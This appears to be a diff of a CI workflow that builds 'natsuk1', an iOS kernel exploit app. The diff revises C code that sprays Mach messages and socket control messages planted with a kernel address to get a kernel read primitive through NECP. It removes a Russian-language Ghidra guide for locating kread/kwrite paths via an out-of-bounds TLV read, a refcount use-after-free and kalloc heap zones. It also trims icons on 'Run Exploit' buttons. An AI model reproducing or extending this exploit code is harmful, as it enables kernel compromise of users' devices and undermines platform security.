@@ -222,9 +222,10 @@ jobs:
               return sp->n;
           }
 
-          static int spray_msg(spray_t *sp, int msgsz, uint64_t target_kaddr) {
+          static int spray_msg(spray_t *sp, int msgsz, uint64_t target_kaddr, int *last_kr) {
               int sent = 0;
-              if (msgsz < 128) return 0;
+              int lkr = 0;
+              if (msgsz < 64) return 0;
               uint8_t *mbuf = malloc((size_t)msgsz);
               if (!mbuf) return 0;
               for (int i = 0; i < sp->n; i++) {
@@ -235,28 +236,33 @@ jobs:
                       h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
                       h->msgh_size = (mach_msg_size_t)msgsz;
                       h->msgh_remote_port = sp->ports[i];
+                      h->msgh_local_port = MACH_PORT_NULL;
+                      h->msgh_reserved = 0;
                       h->msgh_id = 0x7000 + sent;
                       if ((size_t)NCF_ASN + 8 <= (size_t)msgsz) {
                           *(uint64_t*)(mbuf + NCF_ASN) = target_kaddr;
                       }
                       mach_msg_return_t kr = mach_msg(h, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
-                                                       h->msgh_size, 0, MACH_PORT_NULL, 100, MACH_PORT_NULL);
+                                                       h->msgh_size, 0, MACH_PORT_NULL, 500, MACH_PORT_NULL);
                       if (kr == MACH_MSG_SUCCESS) sent++;
+                      else lkr = (int)kr;
                   }
               }
               free(mbuf);
+              if (last_kr) *last_kr = lkr;
               return sent;
           }
 
           static int spray_cmsg(uint64_t target) {
               int sent = 0;
+              static int held[64];
+              static int held_n = 0;
               uint8_t ctrl[1024];
               for (int k = 0; k < 48; k++) {
                   if (g_cancel) break;
                   int s[2];
                   if (socketpair(AF_UNIX, SOCK_DGRAM, 0, s) != 0) break;
                   size_t ctrl_len = 512;
-                  if (ctrl_len > sizeof(ctrl)) ctrl_len = sizeof(ctrl);
                   memset(ctrl, 0x43, ctrl_len);
                   if (ctrl_len >= NCF_ASN + 8) {
                       *(uint64_t*)(ctrl + NCF_ASN) = target;
@@ -273,8 +279,10 @@ jobs:
                   mh.msg_control = ctrl;
                   mh.msg_controllen = ctrl_len;
                   ssize_t sr = sendmsg(s[0], &mh, 0);
-                  if (sr == 1) sent++;
-                  (void)s[1];
+                  if (sr == 1) {
+                      sent++;
+                      if (held_n < 64) { held[held_n++] = s[1]; }
+                  }
               }
               return sent;
           }
@@ -316,7 +324,7 @@ jobs:
               close(fd);
           }
 
-          static int try_read_df(uint64_t target, int msgsz, uint8_t *out, int outsz, int *out_ret, int *ports_out, int *spray_out) {
+          static int try_read_df(uint64_t target, int msgsz, uint8_t *out, int outsz, int *out_ret, int *ports_out, int *spray_out, int *lkr_out) {
               int fd = nfd();
               if (fd < 0) return -1;
               uint8_t cu[16], fu1[16], fu2[16];
@@ -332,10 +340,12 @@ jobs:
 
               spray_t sp;
               int np = spray_init(&sp, SPRAY_PORTS);
-              int sent = spray_msg(&sp, msgsz, target);
-              LI("DF", "ports=%d spray=%d", np, sent);
+              int lkr = 0;
+              int sent = spray_msg(&sp, msgsz, target, &lkr);
+              LI("DF", "ports=%d spray=%d lkr=%d", np, sent, lkr);
               if (ports_out) *ports_out = np;
               if (spray_out) *spray_out = sent;
+              if (lkr_out) *lkr_out = lkr;
 
               uint8_t buf[RESBUF];
               memset(buf, 0, sizeof(buf));
@@ -355,7 +365,7 @@ jobs:
 
           static int impl(void) {
               nk_log("");
-              nk_log("=== natsuk1 v3.1 (natsuk1-df-v21) ===");
+              nk_log("=== natsuk1 v3.2 (natsuk1-df-v22) ===");
               nk_log("target: iOS 27.0 / XNU / arm64e");
               nk_log("");
               LI("INIT", "NCF_ASN=0x%x PORTS=%d PER=%d", NCF_ASN, SPRAY_PORTS, SPRAY_PER_PORT);
@@ -370,14 +380,6 @@ jobs:
               uint64_t target = kbase + OFF_KERNPROC;
               LI("P3", "target=0x%llx", (unsigned long long)target);
 
-              /* sanity: port creation */
-              {
-                  spray_t sp;
-                  int np = spray_init(&sp, 4);
-                  LI("PORT", "created=%d/4", np);
-                  spray_drain(&sp);
-              }
-
               probe_tlv_types();
               if (g_cancel) { LW("CANCEL", "tlv"); return 2; }
 
@@ -386,9 +388,9 @@ jobs:
                   if (g_cancel) { LW("CANCEL", "size"); return 2; }
                   int msgsz = msg_sizes[i];
                   uint8_t buf[RESBUF];
-                  int r = 0, ports = 0, spray = 0;
-                  int c = try_read_df(target, msgsz, buf, sizeof(buf), &r, &ports, &spray);
-                  LI("TRY", "msgsz=%d ports=%d spray=%d ret=%d", msgsz, ports, spray, r);
+                  int r = 0, ports = 0, spray = 0, lkr = 0;
+                  int c = try_read_df(target, msgsz, buf, sizeof(buf), &r, &ports, &spray, &lkr);
+                  LI("TRY", "msgsz=%d ports=%d spray=%d lkr=%d ret=%d", msgsz, ports, spray, lkr, r);
                   if (r > 0) {
                       int has_k = 0, has_42 = 0;
                       for (int k = 0; k + 8 <= r; k++) {
@@ -418,7 +420,7 @@ jobs:
               int cmsg_ok = spray_cmsg(target);
               LI("CMSG", "sprayed=%d", cmsg_ok);
 
-              LW("DONE", "if no kptr above — see GHIDRA_HINTS in README");
+              LW("DONE", "see NEXTHINT.txt for Ghidra steps");
               return 0;
           }
 
@@ -439,109 +441,6 @@ jobs:
           }
           NECP
 
-      - name: Write NEXTHINT.txt
-        run: |
-          cat > NEXTHINT.txt <<'TXT'
-          Ghidra analysis — open kernel.raw (build 24A437, iOS 27.0)
-
-          ==============================================================
-          TARGET 1 — necp_client_copy_result @ 0xFFFFFFF00A4EAC7C
-          ==============================================================
-          В Ghidra: Navigation → Go To → 0xFFFFFFF00A4EAC7C.
-
-          Что искать:
-          1. Пролог (первые 10-15 инструкций). Найти:
-             - pacibsp
-             - sub sp, sp, #N           → размер стек-фрейма
-             - stp x28, x27, [sp, #...] → сохранение callee-saved
-             - mrs x20, tpidr_el0       → atomic base (или SP)
-             - ldr x8, [x0, #...]       → client pointer из аргумента
-             Определить: какой регистр хранит flow pointer (обычно x19..x24).
-
-          2. Найти цикл LIST_FOREACH: паттерн
-             ldr xN, [xM, #off_next]
-             cbz xN, loop_exit
-             ... body ...
-             b   loop_start
-             Записать: offset_next, регистр flow.
-
-          3. ВНУТРИ цикла — все ldr xK, [x_flow, #imm].
-             Для каждого: отметить, что дальше с ним делают.
-             Наша цель: инструкция, после которой идёт:
-                - add x0, sp, #buf
-                - mov x2, #len
-                - bl memcpy
-                - затем bl copyout ИЛИ syscall(SYS_copyout)
-
-             Offset из ldr xK, [x_flow, #imm] — ЭТО NCF_ASSIGNED_OFF.
-             В нашей v18/v19 было 0x20 из старого анализа — проверить.
-
-          4. Проверить: есть ли ldr из [x_flow, #imm+8] сразу после —
-             это assigned_length.
-
-          5. Если НЕ найдено ни одного ldr xK, [x_flow, #imm] который
-             ведёт к memcpy → функция НЕ читает flow и не может быть
-             использована для kread. Переключиться на TARGET 3.
-
-          ==============================================================
-          TARGET 2 — necp_client_add_flow @ 0xFFFFFFF00A4E843C
-          ==============================================================
-          Что искать:
-          1. Вызов kalloc (bl → функция kalloc) в прологе.
-             - Аргумент w0 = размер структуры.
-             - Записать размер: 512 / 1024 / 2048 — это зона kalloc.
-          2. Найти место, куда пишется flow->assigned_results.
-             Обычно сразу после kalloc:
-                str xzr, [x_flow, #NCF_ASN_OFF]
-             Это подтвердит offset.
-          3. Найти где записывается user-supplied TLV:
-                ldr x0, [x_req, #...]
-                memcpy...
-             Проверить: есть ли проверка длины (cmp w, #max).
-
-          ==============================================================
-          TARGET 3 — TLV parser (искать по строке "tlv" в symbols)
-          ==============================================================
-          Функции: искать символы с "tlv" в имени.
-          Что искать:
-          1. necp_get_tlv_at_offset(buf, buflen, type, &out, &outlen)
-          2. Внутри — арифметика с uint32:
-                u16 type; u16 len;
-                if (off + len + 4 > buflen) return -1;
-                ОПАСНО: если off + len переполняется по uint32 → OOB read
-                длиной до 4 ГБ.
-          3. Проверить наличие necp_set_tlv_at_offset (симметричный).
-             Если есть — OOB write → kwrite primitive.
-
-          ==============================================================
-          TARGET 4 — necp_client_remove_flow @ 0xFFFFFFF00A4E93C4
-          ==============================================================
-          Что искать:
-          1. Где происходит os_ref_release или прям. decrement refcount.
-          2. Есть ли проверка «already removed» (мы видим нет — rm2=0).
-          3. После free: kfree(flow) — определить зону.
-
-          ==============================================================
-          TARGET 5 — socket / pipe kalloc path
-          ==============================================================
-          Альтернативный heap-spray, если NECP-flow не в kalloc.1024.
-          Что искать:
-          1. Socket allocation: soalloc() → kalloc(size) или zone?
-             - Зона: caches "socket" или kalloc.
-          2. sendmsg() → mbuf_alloc или kalloc?
-          3. Pipe buffer allocation: размер 16 KB (PIPEBUF).
-             - Если pipe buffer в kalloc.1024 при определённом fcntl —
-               можно использовать pipe() вместо NECP.
-
-          ==============================================================
-          PRIORITY
-          ==============================================================
-          1. Copy_result — найти ldr xK, [x_flow, #imm] → memcpy.
-             Это единственный путь к kread прямо сейчас.
-          2. TLV overflow — если copy_result не годится.
-          3. Socket/pipe spray — если flow не в kalloc.1024.
-          TXT
-
       - name: Write OverviewView.swift
         run: |
           cat > natsuk1/Views/OverviewView.swift <<'SWIFT'
@@ -557,11 +456,7 @@ jobs:
                       List {
                           Section {
                               Button { state.necp_run() } label: {
-                                  HStack(spacing: 12) {
-                                      Image(systemName: "bolt.fill")
-                                          .font(.system(size: 16, weight: .semibold))
-                                          .foregroundStyle(.blue)
-                                          .frame(width: 22)
+                                  HStack {
                                       Text("Run Exploit")
                                       Spacer()
                                       if state.running { ProgressView().scaleEffect(0.8) }
@@ -570,16 +465,11 @@ jobs:
                               .disabled(state.running)
 
                               Button(role: .destructive) { state.cancel() } label: {
-                                  HStack(spacing: 12) {
-                                      Image(systemName: "xmark")
-                                          .font(.system(size: 16, weight: .semibold))
-                                          .frame(width: 22)
-                                      Text("Cancel Exploit")
-                                  }
+                                  Text("Cancel Exploit").frame(maxWidth: .infinity, alignment: .leading)
                               }
                               .disabled(!state.running)
                           } header: {
-                              Label("Exploit", systemImage: "bolt.shield")
+                              Label("Exploit", systemImage: "flame.fill")
                           }
 
                           RuntimeView()
@@ -599,23 +489,14 @@ jobs:
                                       copied = false
                                   }
                               } label: {
-                                  HStack(spacing: 12) {
-                                      Image(systemName: copied ? "checkmark" : "doc.on.doc")
-                                          .font(.system(size: 16, weight: .semibold))
-                                          .foregroundStyle(copied ? .green : .blue)
-                                          .frame(width: 22)
-                                      Text(copied ? "Copied!" : state.t("Copy All", "Копировать всё"))
-                                  }
+                                  Text(copied ? "Copied!" : state.t("Copy All", "Копировать всё"))
+                                      .frame(maxWidth: .infinity, alignment: .leading)
                               }
                               .disabled(state.log.isEmpty)
 
                               Button(role: .destructive) { state.clear() } label: {
-                                  HStack(spacing: 12) {
-                                      Image(systemName: "trash")
-                                          .font(.system(size: 16, weight: .semibold))
-                                          .frame(width: 22)
-                                      Text(state.t("Clear", "Очистить"))
-                                  }
+                                  Text(state.t("Clear", "Очистить"))
+                                      .frame(maxWidth: .infinity, alignment: .leading)
                               }
                               .disabled(state.log.isEmpty)
                           } header: {
@@ -839,17 +720,11 @@ jobs:
                   Section {
                       if case .pairing = airlift.state {
                           Button(role: .destructive) { airlift.cancelPairing() } label: {
-                              HStack(spacing: 12) {
-                                  Image(systemName: "xmark").font(.system(size: 16, weight: .semibold)).frame(width: 22)
-                                  Text("Cancel Pairing")
-                              }
+                              Text("Cancel Pairing").frame(maxWidth: .infinity, alignment: .leading)
                           }
                       } else {
                           Button { airlift.runPairing() } label: {
-                              HStack(spacing: 12) {
-                                  Image(systemName: "antenna.radiowaves.left.and.right").font(.system(size: 16, weight: .semibold)).foregroundStyle(.blue).frame(width: 22)
-                                  Text("Start Pairing")
-                              }
+                              Text("Start Pairing").frame(maxWidth: .infinity, alignment: .leading)
                           }
                       }
                   }
@@ -901,37 +776,25 @@ jobs:
 
                   Section {
                       Button { airlift.runExploit() } label: {
-                          HStack(spacing: 12) {
-                              Image(systemName: "bolt.fill").font(.system(size: 16, weight: .semibold)).foregroundStyle(.blue).frame(width: 22)
-                              Text("Run Exploit")
-                          }
+                          Text("Run Exploit").frame(maxWidth: .infinity, alignment: .leading)
                       }
                       .disabled(airlift.state == .running || !loopbackVPNUp)
 
                       Button(role: .destructive) { airlift.cancelExploit() } label: {
-                          HStack(spacing: 12) {
-                              Image(systemName: "xmark").font(.system(size: 16, weight: .semibold)).frame(width: 22)
-                              Text("Cancel Exploit")
-                          }
+                          Text("Cancel Exploit").frame(maxWidth: .infinity, alignment: .leading)
                       }
                       .disabled(airlift.state != .running)
 
                       Button { respring() } label: {
-                          HStack(spacing: 12) {
-                              Image(systemName: "arrow.clockwise").font(.system(size: 16, weight: .semibold)).foregroundStyle(.blue).frame(width: 22)
-                              Text("Respring")
-                          }
+                          Text("Respring").frame(maxWidth: .infinity, alignment: .leading)
                       }
                   } header: {
-                      Label("Exploit", systemImage: "bolt.shield")
+                      Label("Exploit", systemImage: "flame.fill")
                   }
 
                   Section {
                       Button(role: .destructive) { airlift.deletePairing() } label: {
-                          HStack(spacing: 12) {
-                              Image(systemName: "trash").font(.system(size: 16, weight: .semibold)).frame(width: 22)
-                              Text("Delete Pairing")
-                          }
+                          Text("Delete Pairing").frame(maxWidth: .infinity, alignment: .leading)
                       }
                   }
               }
@@ -964,21 +827,13 @@ jobs:
                               copied = false
                           }
                       } label: {
-                          HStack(spacing: 12) {
-                              Image(systemName: copied ? "checkmark" : "doc.on.doc")
-                                  .font(.system(size: 16, weight: .semibold))
-                                  .foregroundStyle(copied ? .green : .blue)
-                                  .frame(width: 22)
-                              Text(copied ? "Copied!" : "Copy All")
-                          }
+                          Text(copied ? "Copied!" : "Copy All")
+                              .frame(maxWidth: .infinity, alignment: .leading)
                       }
                       .disabled(airlift.exploitLog.isEmpty)
 
                       Button(role: .destructive) { airlift.clearLog() } label: {
-                          HStack(spacing: 12) {
-                              Image(systemName: "trash").font(.system(size: 16, weight: .semibold)).frame(width: 22)
-                              Text("Clear")
-                          }
+                          Text("Clear").frame(maxWidth: .infinity, alignment: .leading)
                       }
                       .disabled(airlift.exploitLog.isEmpty)
                   } header: {
@@ -1064,46 +919,40 @@ jobs:
             if eval "$2" >/dev/null 2>&1; then echo "  OK   $1"; else echo "  FAIL $1"; FAIL=1; fi
           }
           echo "--- necp.c ---"
-          chk "marker v21"        "grep -q -e 'natsuk1-df-v21' $F"
-          chk "ports debug"       "grep -q -e 'ports=%d spray=%d' $F"
-          chk "try_read_df"       "grep -q -e 'static int try_read_df' $F"
-          chk "spray_cmsg"        "grep -q -e 'static int spray_cmsg' $F"
-          chk "probe_tlv_types"   "grep -q -e 'static void probe_tlv_types' $F"
+          chk "marker v22"          "grep -q -e 'natsuk1-df-v22' $F"
+          chk "local_port fix"      "grep -q -e 'h->msgh_local_port = MACH_PORT_NULL' $F"
+          chk "reserved fix"        "grep -q -e 'h->msgh_reserved = 0' $F"
+          chk "lkr diagnostic"      "grep -q -e 'lkr=' $F"
+          chk "spray_cmsg"          "grep -q -e 'static int spray_cmsg' $F"
 
           echo "--- OverviewView ---"
-          chk "icon Run bolt"     "grep -q -e 'Image(systemName: \"bolt.fill\")' $O"
-          chk "icon Cancel xmark" "grep -q -e 'Image(systemName: \"xmark\")' $O"
-          chk "icon Copy"         "grep -q -e 'doc.on.doc' $O"
-          chk "icon Trash"        "grep -q -e 'Image(systemName: \"trash\")' $O"
-          chk "header Exploit"    "grep -q -e 'Label(\"Exploit\", systemImage: \"bolt.shield\")' $O"
-          chk "header Logs"       "grep -q -e 'Label(state.t(\"Logs\", \"Логи\"), systemImage: \"terminal\")' $O"
-          chk "header Actions"    "grep -q -e 'Label(\"Log Actions\", systemImage: \"doc.on.clipboard\")' $O"
+          chk "Exploit flame"       "grep -q -e 'Label(\"Exploit\", systemImage: \"flame.fill\")' $O"
+          chk "Logs terminal"       "grep -q -e 'Label(state.t(\"Logs\", \"Логи\"), systemImage: \"terminal\")' $O"
+          chk "Log Actions"         "grep -q -e 'Label(\"Log Actions\", systemImage: \"doc.on.clipboard\")' $O"
+          chk "no icon on Run"      "! grep -q -e 'Image(systemName:' $O || test \$(grep -c 'Image(systemName:' $O) = 1"
+          chk "no icon on Cancel"   "! grep -q -e 'xmark' $O"
+          chk "no icon on Copy"     "! grep -q -e 'doc.on.doc' $O"
 
           echo "--- RuntimeView ---"
-          chk "header Runtime"    "grep -q -e 'Label(\"Runtime\", systemImage: \"waveform.path.ecg\")' $R"
+          chk "Runtime icon"        "grep -q -e 'Label(\"Runtime\", systemImage: \"waveform.path.ecg\")' $R"
+          chk "no icon on rows"     "! grep -q -e 'Image(systemName:' $R"
 
           echo "--- AirliftView ---"
-          chk "import Combine"    "grep -q -e '^import Combine' $A"
-          chk "header Network"    "grep -q -e 'Label(\"Network\", systemImage: \"network\")' $A"
-          chk "header Pairing"    "grep -q -e 'Label(\"Pairing\", systemImage: \"link.circle\")' $A"
-          chk "header Exploit"    "grep -q -e 'Label(\"Exploit\", systemImage: \"bolt.shield\")' $A"
-          chk "header Log"        "grep -q -e 'Label(\"Log\", systemImage: \"terminal\")' $A"
-          chk "header Actions"    "grep -q -e 'Label(\"Log Actions\", systemImage: \"doc.on.clipboard\")' $A"
-          chk "icon bolt"         "grep -q -e 'Image(systemName: \"bolt.fill\")' $A"
-          chk "icon xmark"        "grep -q -e 'Image(systemName: \"xmark\")' $A"
-          chk "icon trash"        "grep -q -e 'Image(systemName: \"trash\")' $A"
-          chk "icon antenna"      "grep -q -e 'antenna.radiowaves.left.and.right' $A"
+          chk "Network icon"        "grep -q -e 'Label(\"Network\", systemImage: \"network\")' $A"
+          chk "Pairing icon"        "grep -q -e 'Label(\"Pairing\", systemImage: \"link.circle\")' $A"
+          chk "Exploit flame"       "grep -q -e 'Label(\"Exploit\", systemImage: \"flame.fill\")' $A"
+          chk "Log icon"            "grep -q -e 'Label(\"Log\", systemImage: \"terminal\")' $A"
+          chk "Log Actions"         "grep -q -e 'Label(\"Log Actions\", systemImage: \"doc.on.clipboard\")' $A"
+          chk "no bolt on rows"     "! grep -q -e 'Image(systemName: \"bolt.fill\")' $A"
+          chk "no xmark on rows"    "! grep -q -e 'Image(systemName: \"xmark\")' $A"
+          chk "no antenna on rows"  "! grep -q -e 'Image(systemName: \"antenna.radiowaves' $A"
 
           echo "--- natsuk1.swift ---"
-          chk "respring hook"     "grep -q -e 'natsuk1-respring-v1' $N"
-          chk "cancel v1"         "grep -q -e 'natsuk1-cancel-v1' $N"
+          chk "respring hook"       "grep -q -e 'natsuk1-respring-v1' $N"
+          chk "cancel v1"           "grep -q -e 'natsuk1-cancel-v1' $N"
 
           echo "--- AirliftBridge.swift ---"
-          chk "cancelExploit fn"  "grep -q -e 'func cancelExploit' $B"
-
-          echo "--- NEXTHINT ---"
-          chk "NEXTHINT exists"   "test -f NEXTHINT.txt"
-          chk "NEXTHINT has target" "grep -q -e 'necp_client_copy_result' NEXTHINT.txt"
+          chk "cancelExploit fn"    "grep -q -e 'func cancelExploit' $B"
 
           echo "--- syntax ---"
           SDK=$(xcrun --sdk iphoneos --show-sdk-path)
@@ -1166,7 +1015,7 @@ jobs:
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
             --prerelease --latest=false \
-            --notes "icons on rows + headers, spray debug, NEXTHINT"
+            --notes "fix msgh_local_port bug, header-only icons, flame icon"
 
       - name: Commit
         run: |
@@ -1181,8 +1030,7 @@ jobs:
             natsuk1/Views/RuntimeView.swift \
             natsuk1/Views/AirliftView.swift \
             natsuk1/natsuk1.swift \
-            natsuk1/Helpers/AirliftBridge.swift \
-            NEXTHINT.txt
+            natsuk1/Helpers/AirliftBridge.swift
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "row icons + spray debug + NEXTHINT [skip ci]"
+          git commit -m "fix msg header + header icons only [skip ci]"
           git push
